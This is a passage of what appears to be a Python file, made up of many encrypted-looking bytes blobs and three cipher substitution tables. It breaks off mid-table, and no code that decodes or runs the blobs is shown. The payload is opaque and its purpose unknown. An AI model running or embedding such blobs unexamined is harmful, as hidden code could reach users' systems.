b'\xab\xd7\xa7qy\x01X\xcfk\xfa\x0f\xfdc\x9e\x9aR\xc2\xc1\xd6\x0b\xfa\xe4\x84\xb2H\x9e(\x1b\xc9)Zb\x05\xb8\x8cSjw\xf2\x18\xe6I\xba\xc2E\xf6\xc2\x93\xd3\xcf\xf34u\xe8\x87\xefN\xbcdK\xdaE\xa2\xbd\x15\xd7\xeb\xa9\x97Q\x81V\xc6Zq\xf0\xa7Q;\xab\xf5\x15\xa31\x06E\x04s\xd3%\x1b\xe0[\xecJ\xf8\xbf\xfd\xa4\xc9\x8b\xbd7R{\xe3\xac\xd846\xdf\x80{\xd2O\x8b\xf96o\xe7-\xb3\x9b\x85\xa8+j\xbd', b'\xde*^\x8d\x86\xc2\xb7\xda\xe8\xc4\xce\x901\xa2\xebNm\xe6\xdb:\xed#\xf8\xfb\xa4CR\x9b\xf9g\x1e|\x86\x01\x8a\x91\xdfs\xf6\xb4ML\x89\xa9s\xae\xca\t\\\xbd\xe5\n9\xe8n\xf6\xcep\xa3F\x85\x9d\x97{\xfc\x16n\x98\x11\xf5f\x9ey\xaf8*\x1c\xa6\xb8\xa9\xfaM\xdd\xdb\xce\x07\xd4\xadF\xc9k\xdf;\xe1/\x18\xa2\x1b\x1b\xbe\x15\xb6\x8f6p\xf7z:\xc2,\xf73\x04e}\xde}L\xf62\xf3c\xb0C\xa3yH)', b"e\xc8\xdf\x99\xd2\x0c\x01\xda\xc4\xe7Ix%n2&\xde\xc2\xeb\xf2\xe4J\x169b&\x80s\x1c/AI\xc1\xf8\xcep\xee\x1f\x9b\x10{\xdcTD\xb8\xb5*E\x07<\xae\xe2\xe4\xeb\xf7\x98\xac\xba\xccLbj\xf9\xb3x\xe0\x06f8\x01s\xdb\xa14o\x18['#\xcfX\x9d\xb9\xd1\xd0e{H\x8dGR-\xad\x08\x06\xfc(\xe9\xae\xae\xde\xa5\xdd6]_\x8a_\xb0\xbf\xcc\xdc\x06\xd3\x17l\x94v\xc0\x1e\xb5\xddo\xab\xf8\xf9x\xea", b"\x1d\xb3\xd7?\x14>\x06\xf61\xd61\x8a\x9d\xbc\xed\xef>Fz\x92\xa1\xf8\xe3\xcd\xe5\xc7q\xb9\xaa\xb7\xab\x9d+\x0b/\xffV\x97\xa8B\x9a\x7fGR?c\x1du\xba\xb6*^\x14T\xa0\xdc3|-Y\x83\x86\x13\xbf3\x04In\xc3`\x8eg\xa6\x19\xaff\x1dJW\tU\x93V\x93mw\xf1\xce\xf3\xfb\x9dMhk>\xa0_\xfb\xc9\xd3\xb9\xe1\xd6F\xb5\xf3q\xe9\xe3>\x00\x81.\xaa\xd10e\\4\xa7\x1c\x9az\x9b\xba\x95'\x7f", b'\x96\x0c)g\xe8\xec\x08cn\xb5\xe1\xa6s*\xf9\x9c\x1e\xc8\xd3\xccQ\xdeQ\x8f#\xc2UV\xebQ\xad\x81,\xc9\x10\x18Q\x88\xe7w\x9e\x0bt\x9c"\xc4R\xe5\xb2\xa3\xe8*\xc8\x80#XiE\xf1n\xfb\xbe\xe5j\xf9\xeeaD\x8a\x88\xdf\xc3@\x8f\xaa\xea\xacC\xda.5d\x1c\xa4\xef/\xd8\xd0\xef\xd3\n>\xd1\x8b\x01\xb24\xc7\xb7\xac\x90\x1dq\x01;S\x1dl\xc2?|\xde\xb6\xbb\x1dm\xcei\x92\xdb\x11\xb1\xff\x97\x87\x96\xac\x1b', b"\xa3n\xaf\\\xee\x9ed)x\xd5`\xfa\xa4\x9c*[\x1c\xd5\xf4\xb3\xfd\x1c\x94`\xdf\xe4s\xdc#m\xbf\x06),\x83\x85\x0f\x16h\x17\xe0kj3\x0eTQe\xc3\xff\x7f\xd0\xbc\xab3p\x8e{w$b>\x95{\xcf'\x1f\x986\x0f*\xb6\x16\x8dQe\xf5\x80\x81V:\xc6l\xa5\x9b]OW\xb6\x07\xc3\xde\xa7\x88\xbf\xfc\t\x80;\xaeeW\xd9z\x0b\x0b\xc2\x03\xabx\x8e\x12\xe1\x1a`\xfb\xc1\xd0'\x10t\xb9\x8b18c_\xe9", b'$\xfa\xa1\xe9`oA_\xa1\xe8\xd8\x95\xabh\x0bS8\xc1\x14\xa93)\x8f G\xe1O\xc1\xf7\xc70&\xb4\x98$\xce\xa30\xad-^\x1e\xbc\xd8\x82\x04\xa9&\xb6\xff\x15\rM{\xe8cR\x93\xc2\x97\xf6y|\xb3\x95\x0e\x98e\xa9\xb9\x10c\x0e\xaaO\x88\xb4\xa7v\x1ad-\xc3\xd1\r=J*@H_\x86\xa9\xc7A\x068\x1aa\x8a\x89\xb7\xdc%\x9e\xd8\x0e\x1eB\xe4\r\x93\xe3\x84\xd7e\x08\xca\x9ff\xea\x10\x0fS\x1a\xa8\x1fl', b'lsbT\xdd\x1c]\xa9\x04\xdem\x8cu):\xc5\xc8\xceP\x1d\xcc\xd9\x86\xc1v\x8dt\x03u]5f^\xc8\xc7\n\xe4|m?\x0f\xd2<\xf529pI\xf8\x964\xda \xbd\x9c\x90\xd58\x1b\xd9\x98\xfc\x9e\x13\xb8\xe0b\x99\xf1\xeb\xfd\x86M\xb2W\xaf\xc1L\xce\xed*P\xc5\xb2(\x0c\xce!G#\xcd%)\xbdi\x87\x9b\xa1\x92\xb1t\xcf\x8fU\x14p}\xa53\xe5\xb7\xb2\xb5\xf2\xb7\xc1U]\xf2\xde\\\x17\xe17\x0f\xef\x89\x10', b"\xbfgH\xd1\x11\x87\xbe\x93\xd9\xc6\x1b\xec\xf0\xa0\x7fET\x8b\xb8\xec\xe8j\xc6x\xd8\xbb_\x96\x15\xbb\xee\x05\xfaD$\xc2\x0e\x1b\xdf\xf2\x1e?lT\xe5M\x8d\x8c(\x84\x1c\xd0\x93&\x98\xdd\xa7\x96\xd5Hk\x82\x0f\xff\xcc\x7f\xcb`\x11\xc3\x8b\xf2\xb2\x9bC\x97\x83W\x97\x08\x05rP\x1a7\xbb\x96\xcc\xffO,\xce\xde4>\x08\xea\xce\xf9\x03\xb4`)'\xaa\xa1\xc4\xd5\x86\xdam{\x9f\xd1I\xc9\xa9ox4\xc8\xec\x9aF\xc7\x9c\xb1\x17", b'\xbd\x03\xfcN\x87\xae~5\x92\xae\xc5y\xab\xe2$\xe9m\xd5\xd0\xef-\x0e\xb0\x03h\x9a\x956\x8e@6\x9d\xebS\xc5\x1fF\x86wB\xdd\xd5\x0b\xffsX\xdb\xebP\xe3\x04\xe2\xdd\xdar*\t\xf1\xda\xb0\xa3\x06\xf1\x7f\x9e\xe0K\x88\xc7:\xb2\x9f\x18\r\x0b\x96\xec5^\x1d(|\xf4\xb3OA(\x8f\xa7\xce.a\xfd`\x905\xa8\x11\x1b^H\x9b\x0c\x92\xb7\x1a\x1e\xccM\x98e\x9f\xb2R\xa4vH#\x16\xe1\xeb\x87\x91\x19m\x8c\x80^', b'mi\xbe\x912_aS\x83h\x80\xbaH\x8b\x15\x93kg\x98U\xd5\x83\xd3L)h8s\xd8#\x05>\x04c\x1b\x1a\x0f\xedW\xe0%\x8cL\xfeXpK\x1d\x1e}+\x97f\xdfi1\xde\x1c,\xd9\xf3\xd1\x97\xa2I2\x11\x92\x97\xcd\x7f|\xbe\x1c\xcd\xe8\xc3O\xf0\xce\xe8\xbd\xff\xf1\xd1+q\xa5\xc8\x1d\xe4\xed>\xc4\xc3$\xb1q\\\xbe\xf6\xf5\xa8\xed<\xeb\xac\x95\x1d:\xdd\xb0\xfb\xa4\xd5\x15\x08a\xb9\x0c\xaf^@\x17/\xfd\x86;', b'\t\x17\xe8\x8cb\x1a\x97:\\\xbd\xb9M\xb6i,\x19n\x91\xfb\xc5q\xc4\xed\x05\x10\'oO\xcc\x9d:\r"~Ve\xfa\xc7\x97U\xc8X\xc7\xcf\x10\xa69\xbfv\xa5\xfd\x19e\xb2:La\x8d]*\xf6?J\x14a\xaeZ\x1c\x16\xfd\xbc.W\xeb^\x91uB\xc2N\x83\xdeb\xee2S\x08\x1c\xb8\xbc!\x94\r\xc1\xf7\x1e\x94\x90\'\xcb\x00\x7f\x02\x84\xcb\x878\x96}\x94l\'C#\x8f\xd1\xec\x96RN`\xd6\xcc\xac\x1eQy\xa0', b'\\\x80zg\x07\xb5\xcav\xf9x\xa6h\x081\xf4^\xa1>Y\xc3~\xea\xef$\x84\xa5i\xaa\x15\xe7b\xb3\xe7\xa6\x03\xaa\x8a\xa4\xcc&\xeaD\xf96\xa6\xa8\xad\xa0\xf8\xf8\xb9\x1a\x81\xda\xd2\xdb\x80\xb3Ae\xd2\x1c\x15\xbbF\x00\xd4\xaf\xe1\xb50/\xb7OT\x9a\xdf\x04C\xb8\xec\x9f\nY\xb7\xa8\x9a\xe5\x97D\xbf\xf2\xcb\x85\x0e\xd5E\xf81\xc7\xf8\x16a\xe4\xe5\xbe\xf1\x0b\xf6\x11\xa7cqF+\xfa\xb4\x18%\xec1-*W6]\x1a\xa5', b'\xc9\x0c\xe9\x8e\x91\xa7\xaf\x8d\xd2\x85\xd07\xad0\x95\x16\x80b\xe9zM\xc5\x06\x0b\xd1\x0e\xa7\x1co\x9e\xa7\x9d\xdf3m\x98\xcbC\xf0\xebw\x0eO8,_6*\xe5\xe3\xe0t\xf2\xbb\\\x98\x04\x91\xcd\xe9T\xad\x8da\xab\xb1V\x8a\x17\xcc\x1b\x84\x81\xb4\x9fX\xb6Z\x9b\xf2\xf3\xc2I{3<z\xf93\xeb\xd4O\xa7B$\xf8\xdb\x877\xb9W\x1c\xfa%\xa3\x1e}\xb6\x9d\x11\xe6\xe0j\xdd\xff\r\x0b\xc9[\x7f\x85]\x90\xa0\xc2\x17\x02\xa0', b'\xc3~h\xbb\x16\\\xb5C#!\xd0#\n\xb2\xfc:\x16~\x8e\x7f\xcf\xe5\x93\xcf!\xb3[\xb1\x81\x83\xf9\x1f\xe8\xe2\x97}\x1e*\x08\x13\xfd$\xb1\xe1\x84\x04\x11\xe8\x04\xec \x978"\xbc\x8e\x01c\x91\xbaS\x81\xbdN9\xbd\x87\xe8&jY3\xc3\x01\xa2\xbah\x17<!\xcdt\xea\xf86\x1f\xa4\x96VK\xf7\xb0\x1dp\x1f\xc7\xda\xd1\xc0x\xa5\xe8\xccV\x10\x9a\xce"\n\xb3\xaf\x8e\x19\xd6\xd4\xac\xd5JY\xca\xf7\x8c;\xf2\xe7\xa0T\xf4', b"\xac\xca<\xae1\xfd\xaf1\x9aV\x13\xee\xad']n\x9b\x89\xc7\xd9\x8e\xa3\x1d\xef\xc8\xa9}\xa8\x07\x83+\xfe\x84\x1c\xb2\x0f\x7fpn\x92L\xc67.~)3\xc3F\x99M\x9e5\xdd\x1b;\xaf\xba|\xb3X\x19+J\xb0\x8c\xa9v\x9dg\xd4\xc4,a\xe7\x9a\x0e\xf4\x13\x8d\xda\x83\x1eN\xa5\x03\xc2\xfc\x9f5\xab`\x90\x1eq\xc00f\x96a\xdc\xe0(\x06j\x19\xe5\x7f\xab\xd0\xc7\x01r\x8c\xb0w\xce\x9a\xbe;Y`\x0cmv(#\xc4", b'\xb8\x81\x9b)iK\x87ql#D\x11\xb1\x00{>\x9f\xfc\xc2\xa2\xc8\xf0B\xa7{\x95\xba\xa0Sj\xd8\xaf\xc1u\x82\xeccF\xc9O\xa5\x05~\xde\xdd\xcb\xdb\x1el\xb6\xb0\xcb)v\xf1\x81\x87\x03\xebM\x12U.\x0c>xeY\xca\xf1\x04j\xa7:+\xe0\x05@\xc8\x823\x8d\xeb\xdc\xc3s\xd7\xca\xcd\xbe\xbe\x81\x912ypU\xb11\xff\x16\xbe\x8aO\xdb\xf4\x08\xc02\x8dH\xef\xbe\x1a\x15\x91d\x05o,g\x92\xb7j\x11\xc1\xea\x99', b'\x9c\xd4|\xe1\xceAX}\x8f\x7f\xc3\xd8=\xd2\xd9\xb1\x81\x9fbF\xc9\xf6\xe2\xf7n\x98\xb0C\xee\x9ba\xb4\xf2"\x12\x9d\x13>\xe1\xca\x07\x9d\xaa\xba\x16\x0bp\xa8\xb6\xca\xa4\x04\x03\x12c\xba>\x13\x8eZ+\xbc~\x1eI\x88\x84:,?Mo\xc4,\x94|k-y[\xb9\xe1\x19\x8f5p\xf8;D\xd6\xb5gk\xc8\xbf\xb2\x85J\xdc\x8d\xf2\x15\xc1 \xf8\xfcS\x01S0\x16{\x11\r4\xcd93\xd9\xa7\x81\xae_\x07\x91\xfa1\xa5', b'\x0c\x05\xfc\xfeJ\xbc9\xb2\xbd\xafW\x8c\x0cDU;lhYH\x1b\x85\xf9\xe7\x00\x93F\x9b\xa1dh,yR\x04n}\xcb$+\xd23\xa25@\xd3\xa0\x93\xa18\xf7\xe2\xc2\x81\x91\xb7\xe1\x1a\x99\xb9\x86e\xd0\x02\x8d}<\n\xe5\xe6\xa8E\xac\x8b\xd4\xb9\xb3\xc6I\xd0g\xc1f\x98\x82\xd1>PV\xbe\xf5\x06E\xb9\xeer#w\xa3y\xbfP\x12]\xefl\xc8H\x00T\x95\x1d\xba\xf49$\x8f\xa0^\xc2\xd4\xf8\xa6\xab\xa3\xee4\xf7', b'\xe5al@\x10\x91\xed \x92\x1c-\xd1[\xe3\xe5\x0f\xe7\x1b.\xc1\xb8\xa5\x13\xfal\x10k\xd6P\xcd5\x0fP\xab\x93|`\x0f\x16(\x87\xc7\xe8\xe7\x14\x17\xc83\xf4Tx\xfbJ\xb5PbW\x92z\xefU\xcf\xc3\x0e\xc5X\xb0\x14\x82\xf3;\xe4\xc48\x97\xd8\x17\xc4.\x046\x80\x90\xc2\x85\x91\xa8\xd8/q[\x9e\x06\x9e\x18\xb9t\x05\xfb2\xc9/\xe8y\xb1\xc3T\xd68\x18U\x18+\xa0y\x80\x8c\x7f\x94#\xfez\xc5tgv\x0ek', b"\xa3\x0b\tR1X\xe4\x87\xfd\xf5\x9d\x1f\x9f\x01\x84\xb4Y\x12\xc9\xf3\xcb\xbe\xd3R%\x88\xee\xc2\x02Y\xfc}\xa3\x02O|9\xe7\x18\xfc\x93\xd2jt\xec\xa5\xbf\xdb\xdd1\xaf+\xe2\xe5\x1f\xa7\x96\x04\x02\x83\r\x16\xbb\xb18\x0fq\xb8\xb5\xd9@#\xa6:\xe7i\xda\xd2\x92\xeb&\x91\x1b[jP\x82\xb6\x13\xdf\\\xef\xfbQ\x90\t'}\xfd\x9f>\xf2\xfe1\x042]\xea\xe5\x98\x88\xfd\x1b\xaa\xd5\x1bpc\xa9-|j)n\xca\xf5\x139", b"\x15\xec\xf7M\xa8\x9e\xce\x8a*\x19\x08\xf0\xd9\xf8\\Qg\xd34\x90\xcb\xa7X9!F\xc5\x8a\x8b\xe0#@\x8a*\x86H\xcfQ\r\xf8Q\xf8\xe1\xa3=\x9e\x81x\xb4\r1\xd0`\xab\x0b\xb5\x16iL\x7f\xd4\xdb\xda\xd2\xbf\xa3I\x91\x9a\xadL\x08\xb37\xaf\x1c\xfc?\xe0\x84t\xd0\xbf8Z\x15\x11\xb3x4\xc8\xd4\x03 \xdd3KP\xbbR4\xaf\x9d\xe7\x1c\x0cx\xeaxy\xaf6\xc3\x89\x8f+Ky\xc5\xac2\x1b\x15k\xc2'\xf0 ", b'c\xa7\x7f\x99\xe9T\xd0@\xa70\xcc\x9e\\7 \xb8\xcc\xac\xc7\r\xbd\rh\x9ci\xc3Q\x90@\xcc\x1eX\x1b\xdf\xf5L\xa3\xa05rjM\xc7\x0bfhL\x93F\xba#h.uk\'\xa2]8\x94\x03y\x95\x94"\xc8u\xc1\x1d&|\xfa\xa2D\xc9/j\x01\xb1\x83\x968W\xa3\x7f@\x8e\x0b\xfd\xd7\x88_JH\x14\xda@\xf9ZC\xc2\xcf\xfb\xa4Q\x04\xb4M\xd4hw,TK#G\xc95Y1\x03\':\r\xd4]\xe7m', b'\xc2\xd8\xfb\xfc\xae=O\xdf\xe7\x99+\x92\xe4\x90\xdd\x84n|]\xc81\xc5\xd6t(\xe6K\xed\x90\x8b\xc7|K\xcb\x98Vn\x90^>\xfc\x85\x88\x89`@\x0f\xf9K\x90\xfa\x1d\x1e\x9c\xce\x94C\xe4\x9e` =Y\x1a\xe6\x08\x11\r\xc2\xda\x8f\x99\xe8\x89\x14\xf3OQ&\tJ&\xdf\xe2\xce\x00e\x8dD\xc1k&\xfay\x02\x8b\x91\x0c)X\xabD\xee\x00\xac\xf02c\xbb\xad\x1c\xce\xa4\x11\x0c\xc4\xed\x1f\x97J\xe2o\x95-\xceuK\xc6', b'\xda\x08\x08\xc4$\xf8\xd2\xd6<\x05H\xde\xf0X>\x0e\xe83\x9e/\xaa\x8c\xf6\xbf\xbc;\xb0\xd7o\x10\xf2\xb1\xa1\xc8F6\xe2#\xa2\x07\x17\xba:\x8c\xdeV\xff\xc2\xf8\xd0d\x9f\xe3\x89\xfc\xd6\xa3\x99&$Jt\nj\xf5\xacV\xe0\x8d\x03\xbf\xfe\x17\x105\x9bUmc\x1bdL2\x85\xfbx\x9f|Jkj\x0c\x1e\x913\x84\x8f\xe3\x80\x13fKJ\x99\x01\xf2\x98\xe1\xe6\xae\xd5\xe5\xe8\t \x16K\xb1\x91\xc8[`\xe0\xe8\xe6\xce\x7f1', b"\x10G\x1f\xee\x87\xabRn\x04\xc4{\xf8.`|\xea\x12\x82u\xd8T+K\r\xeb\x9fwhu\xd2\x04\x1d3#\xddZ)\xe1\x03\xbd\xc3O\xf5\xf0\x81(\xd0\xee\xdd\xea\xefH\xd3\xd1\xf5hFAf\xf5\x94d\x01\xc2\xd52D\xd9<&\xd7\xefU\xe5\x17z%\xad\x91p:'\x15\x8f\xd2\xe2Y\xa2\xd5\x00\xcfU\xeah?,E\x8b\x86~\xd8w\x95ud\xd2\xf2-\xed\xd5JC\xf4S\xc1r\x11\x19\xa6b\xf0\xdez\x90E\xbf\xa2\x99", b'EB\xc3\xd7\xa9\x8b\xe8\x99\xca\xa8\xf9\x15\xaf\xeb\xdbE\xe1\xf3N\xbe\xe0\xc3\xd5{\x9b\rQ\xc5\xec=W\xcaD\xcf\x94%\x8ek\x9eH\\\xc9P\xa65ch\xfa\x0f\xf2\x96t\x8e\xc0\xb91l\xa1\xd5\x13l3J\x15\x1c\x93\x06\x8e>\xa6\xbc\xc6\x98\xb5\xe3\xb0\xcdn\xb8_\xa1s\x87c\x1f\xc0#\xd2\xe7\x16\xfc\xef\xae\xd1\xb2\xe9\xac\x8by\xa4>\xe3\xc7\x18\x86\xb80\x9d:\x99j\xbb\xde/l\xe8\xcfu\x93\x86\x8d8]{zU\xaa{', b"@|>\xa9\xb2s\xb2\x86\xb0\xfb\xa4\x18nQ\xa5\xec\xdd\x83w\xe8N\xc8\x9a\x06\xd1z\x86\xff|\xbc\x03<\xc1l\xa5_\xe3\xa5\x81\xd9<\xb7\xe41\xb4\xd8'\xb1U]\x85U\x02\x84\x87\x0f\x08n\xf0\x9d\x86\x8a\xeb\xa7\x9a9\xe5\xe0\x82\xd7c\xcb\xf1\x99\xaamo}\xaf\x9ah\x17\xc8\xca~\xdd\x08\t6\xb5\x1e\xb3r\xc7'\xbe\xec\xbaK:`S\x08\x03cJ\xcd;\x10\xcf\xde\xacK\xf6\xec(\x1e>i\x80\xbe\xfc\xe4\xed\x1a\xe0\x92\x86", b'\xd28k\xc7\x93"\x9d3\xcb\xbe\xaf\x0b\xe6\x92\xbe\xa5\x1e\x0f)t\xb7EC\xb8\xc2\x18|\xccdh,i9>]\x12\xcc\x8e\rh\xb2\x13\xaf\xf7\xa1\xdd\x0c\x0b"\xb9\x8e\xf5\xcf\x8c\xd0\x9d\xcb\xe034\xb0\x1b8\nG6Y\x9f~\xe7\xceI\xff\x0b\xf6&S;%\xe3g\x15\xdd\x1e\x05\x05\xc7\x96X5=\xcfj\xa5,\xf9D!\xe0\xbb\xb3V\x18\xa6\xc9\xd4\xbcb\x9ed\xb6\x98mu\x81\xff\xf0\x89\t\xc3\xaew%1\xa6\xbcQ\xb2', b'\xd6N\x83\xefP\xb9\xc3\x84S^&\x92`Rg\xb8\x18[\xad\x18?\xf7\xed\x84>\xd3\x1d\xb8\x93\x16^\xaf=HT\x0fci \xe4\x1fubon1\xa8\xc5;r\xec\xfe\xed\xba\xee3q\xe4\x92\xf7\x90\x0c\xc32\xc2&S\x86\xa4\x13\x0f!\xed\x885\xd9c\n\xdc<\x92\xbf\xe2\xe0\xa0\xcf\x89tv\xf7\x1f\x93(\xa6\xee\xf6\xa8D\xb0\x04|8\xc2\xd1\xf7Z\xbe\xec\x08\xaeb\x85SH\x8d\xd1\xfd*\xff\xbdy\x1e\x94)\n\x04\x7f\xb7', b'\x92\x03\xd3\xd2~\x89\xa5&A\x82\x86\x81\xda\xcfa]\x93\x05\x02"\xca \xa4l\r\x97}n4\xb7\x12\xc6yUE\x12\x8b\xac9\x08\xa00\xfe./+\xae\xbaB\xe5\xeapL\xb4\xeea\x0b>Yk \x07d\xcf\xef2\xbc%\xc5\x12\xe4\x821q\x1d\xf2\xb2Z\x08\xa0Y\xb5/\t\xa5C\xf4\xa8\xb0\x03\xe9\x90\xc2?\x8b\xf0-\x87\x12\xb2\x12R\xd1\xf7\xd7Vn\x01^\xfdcr `\xcd\x0c\xa3\x07\xc1\x00:\xcf\x84\xa8\xe2O)\xdf', b'0d\x8b@\x82y\x9be^?\x1a\xde\x83\'b&\xe6\xfe\xdf}R[\xff\xa2\xb5\xd8J7\x95\x0c\xda\x80\xed<&\x96\x05\xa9\x7f\xbb\x1c\xd6\xb2\xfb\xc8\xeb\x82\xd8h\xdd\x1b\xfaZ\x8d\xba\xe9\xc2\x99z\xbf\x89!\xf4+3\xc7\rK\xa1|\x98v\x0f\x16]O\xff\x02\x01\x1b\x0c"i\xe1\xec\xd1\xee\xc0y\xf0\x80\x9b\x1e\xf9V\r\x95\xb7\xc2\xa3\xcd\xb8\xa8a K0V\nq5\x91\xf2L0\xab\xec;y\xeb~\xe8\xb0@\xcb\xf2|\x0c', b'\x1a\xc7\x01\xe3D\x83\xc7+1\xbd|\x89Wkk\xe9^\x06\xad\xbc.2\xa5vx\xf2;\x89\xfbLT\xdfp\x8c\xb1M\xa1\x10R\x97B\x1au\x8d\xfc\x1c\x94|\xf8Y\x9cwN\x8e\x9cD\xea\xc6\x1d`\xe1d\\\xf3\xd0\xda\xee+\xee\xf7\\k\xeb\xd15\xb6j`\xe67\xdd\xd7B\xed0\xd3g|\xb4\x10:\x03\xba\x8d\xab%r\xd7\x81\xe8\xa4\\)\x8c\xee\xa52\xd0\xa7\xbb\xbc\xc8\xcc.m\x8d\x8d\xe3\x99\xfbo\x7f\xc8r\xb1\xf0\x9a\n', b'\x95\xd6\xbeY\xcab\xf8wd\xf6\xf6\xa7\xd0\x0b\xe0\xad3\xbc\xed\xde\x8b:\x08D\xc4\xf4a\xb5\xcf\xb53\xfd\xb1$`\xd0!\xafb\xa14\x8c\x19\xdbJ\x83Y\xef\xdeR\xae\xd7\x93\x1f\xa45:\xc2H\xc8\xb7\xc33<\x00;i\xac1\xe3\xa7nH\xea\x89\xb3S\x16\xd1\xc2n1*Y]W\x85Q{\x89;(b\x86r \xd3\xe2\xfd\xd1\xf2H\x96\x13;B\xa2\xff\x84\xbf\x94\xa5\x06\x994\xf2X\xa3n4/\x07\x87.\x14/*\xc0', b'\xb7Q0\xf6\xea\x8cq\\\xad>\xdb\x8c\xe2\xaa\x80;\xdb\xcc\x90\xfd\x82\taB\x96V$\x13\xeby\x15\\\x08\xa2zt]\x11\xf98\xfe\xf54\xab(\x0f\xf6z9\xca<C\xa41\x92\xa4\xfa\x94\xda,Xo\x89\x7f\xb1\xeb=\xe6 \xa0\x04\x81\x83+\x0f\xc8\xed\x03H\xdc\x06*O\\\xfa\x17\x9c\x8c|\xc2Y\xd4qu\x04\xe8\xa7I\xa4\xef\xa0-<\x8dm\x13Gs\xc6\xc5h8\x95T\xc9\xc55E\x02\x9a\xf8Cy9E0 1', b'0\x00\xb7Sw\xec\x97\xa3"/\xff\xa4\xaa\n\x94Gh9\t\x06\xdf\xef\'\x92I\x04\xd2\xc4).v\xd1\x91g\xe6<\xab-X\xca\x89c\xcbi\xa3\x02\x03\x98\xe8T\xb2\xd1\x1a\xff\xbc\xd3\xdd\xfe~3\x8d\xa4\xa9]\xe1e\xd89I\xed\xd7u\xe9\'\xea\xda\xe4\xae2\xbe\x84\x14\xbe"!\x19\x0f\x1d\x04\xfcT\xfe\xefT\xf5\xa3\xf8y\x94I\xd4\x13:\xf9\rQ+,{\xe6-\xe8:\x94dk_\x17qS\x7fn\x16\xc9\xb8\xc7\x86\xa5', b'\xea\x85\x0f\xd9(\xac\xbd\x8e\xd4\xd4\x86G\x85\xf1g\x81\xa0\x87\xb7L-\x1cSU\xd5\xfb\xfc1q\xf4\xf4\xb7\xd5\x9bK\x12\xd2\xe6Z\x19\xee\x86&\x9c\xb7x]\xe1&\xc3\xc8\x9f\xd5\x01\xce\x1e\xaa\xa7\xbc\x17JY\xcc\xaf_(ka1\xbb\x1au\x84x\x125\xcd"\xe0\xec\xcb\xcb\xf5D\x8f\x80\x83\xb3p\xd9\xfc5\x1b\xa4\xb2j9XM>\xdb\xa1:\xa4\xeeZ\xc2\xfa1\x04\x96\x08.o<\xa0B\xc3\x057X\xf5\t^4\xa5<\xb0']
_sb = [1, 47, 167, 162, 238, 43, 6, 179, 70, 17, 217, 82, 173, 95, 137, 151, 247, 251, 165, 125, 193, 62, 253, 129, 26, 201, 93, 246, 15, 3, 242, 252, 51, 134, 163, 133, 210, 211, 107, 84, 126, 168, 39, 219, 36, 232, 54, 44, 206, 212, 239, 119, 220, 34, 235, 68, 65, 88, 67, 195, 19, 38, 138, 183, 85, 136, 42, 32, 153, 102, 148, 9, 24, 236, 200, 96, 204, 108, 22, 69, 180, 254, 144, 176, 131, 66, 182, 40, 116, 175, 213, 152, 28, 33, 160, 30, 100, 141, 132, 98, 118, 178, 169, 25, 233, 207, 37, 10, 61, 245, 223, 8, 92, 218, 106, 109, 222, 154, 27, 216, 52, 234, 63, 11, 243, 194, 197, 155, 29, 199, 122, 103, 104, 135, 105, 78, 113, 86, 111, 58, 214, 117, 5, 244, 221, 150, 16, 75, 81, 91, 166, 225, 143, 35, 121, 46, 231, 99, 87, 76, 227, 89, 14, 59, 48, 189, 230, 90, 156, 184, 202, 49, 31, 142, 248, 112, 190, 64, 57, 228, 149, 124, 4, 20, 198, 237, 130, 50, 73, 196, 60, 177, 181, 114, 164, 128, 172, 41, 83, 94, 192, 45, 79, 13, 101, 115, 120, 250, 158, 80, 188, 123, 208, 53, 147, 187, 74, 7, 186, 185, 249, 241, 229, 21, 170, 226, 56, 18, 2, 23, 71, 161, 0, 157, 191, 146, 240, 205, 97, 215, 209, 55, 203, 174, 127, 224, 159, 139, 145, 110, 12, 72, 171, 140, 255, 77]
_isb = [232, 0, 228, 29, 182, 142, 6, 217, 111, 71, 107, 123, 250, 203, 162, 28, 146, 9, 227, 60, 183, 223, 78, 229, 72, 103, 24, 118, 92, 128, 95, 172, 67, 93, 53, 153, 44, 106, 61, 42, 87, 197, 66, 5, 47, 201, 155, 1, 164, 171, 187, 32, 120, 213, 46, 241, 226, 178, 139, 163, 190, 108, 21, 122, 177, 56, 85, 58, 55, 79, 8, 230, 251, 188, 216, 147, 159, 255, 135, 202, 209, 148, 11, 198, 39, 64, 137, 158, 57, 161, 167, 149, 112, 26, 199, 13, 75, 238, 99, 157, 96, 204, 69, 131, 132, 134, 114, 38, 77, 115, 249, 138, 175, 136, 193, 205, 88, 141, 100, 51, 206, 154, 130, 211, 181, 19, 40, 244, 195, 23, 186, 84, 98, 35, 33, 133, 65, 14, 62, 247, 253, 97, 173, 152, 82, 248, 235, 214, 70, 180, 145, 15, 91, 68, 117, 127, 168, 233, 208, 246, 94, 231, 3, 34, 194, 18, 150, 2, 41, 102, 224, 252, 196, 12, 243, 89, 83, 191, 101, 7, 80, 192, 86, 63, 169, 219, 218, 215, 210, 165, 176, 234, 200, 20, 125, 59, 189, 126, 184, 129, 74, 25, 170, 242, 76, 237, 48, 105, 212, 240, 36, 37, 49, 90, 140, 239, 119, 10, 113, 43, 52, 144, 116, 110, 245, 151, 225, 160, 179, 222, 166, 156, 45, 104, 121, 54, 73, 185, 4, 50, 236, 221, 30, 124, 143, 109, 27, 16, 174, 220, 207, 17, 31, 22, 81, 254]
_sb2 = [40, 94, 117, 174, 194, 89, 173, 220, 119, 212, 77, 211, 97, 152, 181, 237, 123, 242, 154, 106, 216, 47, 3, 249, 49, 79, 218, 205, 185, 85, 68, 179, 129, 251, 36, 13, 132, 191, 30, 224, 138, 184, 63, 248, 133, 252, 238, 18, 139, 223, 55, 43, 159, 126, 199, 33, 88, 210, 26, 146, 163, 148, 35, 168, 188, 250, 113, 0, 175, 183, 177, 165, 41, 99, 69, 135, 82, 187, 80, 59, 6, 167, 50, 111, 14, 147, 150, 45, 198, 247, 200, 109, 114, 140, 67, 64, 8, 90, 213, 5, 86, 239, 46, 102, 10, 157, 4, 134, 11, 222, 221, 137, 38, 22, 122, 240, 145, 108, 182, 62, 172, 178, 128, 217, 23, 214, 127, 254, 100, 42, 76, 255, 21, 170, 203, 91, 166, 215, 142, 219, 158, 78, 9, 231, 98, 186, 75, 27, 156, 225, 144, 65, 209, 48, 236, 1, 25, 54, 131, 28, 141, 124, 151, 2, 169, 130, 81, 121, 16, 115, 32, 51, 195, 15, 39, 136, 235, 95, 93, 73, 112, 101, 190, 17, 228, 104, 253, 74, 125, 246, 206, 162, 229, 161, 19, 12, 201, 120, 29, 31, 207, 244, 241, 192, 118, 84, 7, 153, 208, 143, 110, 52, 58, 103, 107, 193, 105, 233, 57, 60, 245, 155, 53, 37, 197, 83, 204, 56, 92, 227, 116, 160, 232, 230, 176, 66, 164, 196, 149, 202, 226, 70, 243, 234, 